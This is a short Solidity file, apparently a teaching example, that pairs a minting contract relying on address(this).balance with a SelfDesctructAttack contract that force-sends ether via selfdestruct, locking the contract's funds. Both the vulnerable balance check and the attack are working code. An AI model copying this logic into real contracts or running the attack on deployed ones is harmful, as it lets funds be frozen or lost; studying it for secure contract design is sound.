// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "hardhat/console.sol";

contract MintByDepositing{
  address public lastMinter;  
  uint public target = 30 ether;  
  
  // If contract has payable receive function, just sending ether will cause same result.
  // receive() external payable {}
  // fallback() external payable {}

  function depositMintingEther() public payable  {
  		require(msg.value == 1 ether, "You can only mint one NFT at a time");
      uint bal = address(this).balance;
      
      require(bal <= target, "We have run out of NFTs");
      
      console.log(lastMinter);
      if(bal == target){
      		lastMinter = msg.sender;
      }
  }
          
  function receiveFunds() public {
  		require(msg.sender == lastMinter, "Not winner");
          
      (bool success, ) = msg.sender.call{value : address(this).balance}("");      
      require(success, "Cannot send funds");
      }
  }
        
contract SelfDesctructAttack{
       
   MintByDepositing badMinter;
   constructor(MintByDepositing _badMinter) {
   		badMinter = MintByDepositing(_badMinter);
   }
          
   function spoiler () public payable{
   		address payable mintAddress = payable(address(badMinter));    
   		selfdestruct(mintAddress);
   }
}

